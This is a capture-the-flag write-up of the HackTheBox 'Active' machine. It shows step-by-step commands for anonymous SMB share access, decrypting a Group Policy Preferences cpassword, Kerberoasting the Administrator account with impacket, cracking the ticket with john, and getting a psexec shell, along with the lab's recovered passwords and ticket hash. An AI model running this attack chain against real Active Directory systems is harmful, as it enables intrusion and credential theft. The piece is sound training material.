---
title: "Active HTB Writeup"
date: 2021-04-30T00:54:40+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",
    "easy",
    "windows",
]
---
![Machine Info](/images/active/1.png)

### 1. Enumeration:
* Nmap:
To scan for open ports and services running
 * ``$ nmap -sC -sV -A 10.10.10.100 -Pn``
![](/images/active/2.png)

Many ports are open so let's focus on the important ones only:
 * ``kerberos on 88 , netbios-ssn on 139 , ldap on 389,3268`` 

SMB Enumeration:

As we have netbios-ssn open on port 139 let’s run smbmap and see if their shared files..
 * ``smbmap -H 10.10.10.100``
![](/images/active/3.png)
see! we can acces Replication..

* smbclient:
 * ``smbclient //10.10.10.100/Replication``
,and there is no password just press enter
![](/images/active/4.png)
![](/images/active/5.png)

a lot of interesting files, you can get only one file at a time if you want using ``get filename``

I'll get the whole directory locally:
* ``smbget -R smb://10.10.10.100/Replication``
![](/images/active/6.png)

inside ``/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`` >> file named (Groups.xml) includes username and hashed password
![](/images/active/7.png)

or just using ``grep -r “password”``
-r for recursive will search the files inside the folder for any password word..
![](/images/active/8.png)

cpassword= "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName= "active.htb\SVC_TGS"

Decrypting GPP:

* About [GPP password](https://adsecurity.org/?p=2288) (Group Policy Preferences)
* search for cpassword
![](/images/active/9.png)

let's decrypt the hash with ``gpp-decrypt`` preinstalled on kali:

``gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ``
![](/images/active/10.png)
and we got the password:``GPPstillStandingStrong2k18``

Getting User:

* Now as we know the user credentials ``SVC_TGS:GPPstillStandingStrong2k18``

* To know user privileges:
``$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100``
![](/images/active/11.png)

Logging to Users folder:
* ``$ smbclient //10.10.10.100/Users -U SVC_TGS``
![](/images/active/12.png)

getting user.txt locally as before:
![](/images/active/13.png)

Getting Administrator:

now we need to get the admin credentials. From the nmap scan we saw that kerberos is running at port 88 

``Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking. Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene.``

To read more about kerveroasting check these articles [1](https://room362.com/post/2016/kerberoast-pt1/), [2](https://room362.com/post/2016/kerberoast-pt2/), [3](https://room362.com/post/2016/kerberoast-pt3/)

After adding the hostname to our /etc/hosts
![](/images/active/14.png)

Getting ticket:
Will use this tool (GetUserSPNs) from [impacket](https://github.com/SecureAuthCorp/impacket)
![](/images/active/15.png)

* ``$ impacket-GetUserSPNs -request active.htb/SVC_TGS``
![](/images/active/16.png)

* ``$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save -outputfile GetUserSPNs.out``
* -save -outputfile GetUserSPNs.out : you can add this to save to a file
![](/images/active/17.png)
got this error ``KRB_AP_ERR_SKEW(Clock skew too great)``

* we need to sync our host with the domain controller
![](/images/active/18.png)

```text
$ sudo apt-get install ntpdate
$ sudo ntpdate 10.10.10.100
```
![](/images/active/19.png)

* ``$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18``
![](/images/active/20.png)

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174
```
And we got the ticket let's crack it with john:

``$ john --wordlist=/usr/share/wordlists/rockyou.txt ticket.txt``
![](/images/active/21.png)

The password is:``Ticketmaster1968``

we could now get the root.txt file from smb using:
* ``smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968``
![](/images/active/22.png)

### But i prefer getting a Shell:
* let's get shell using ``psexec`` from impacket
 * ``$ /usr/bin/impacket-psexec administrator@active.htb``
![](/images/active/23.png)

Hope you enjoyed the writeup for this awesome machine..

if so kindly gimme respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588).
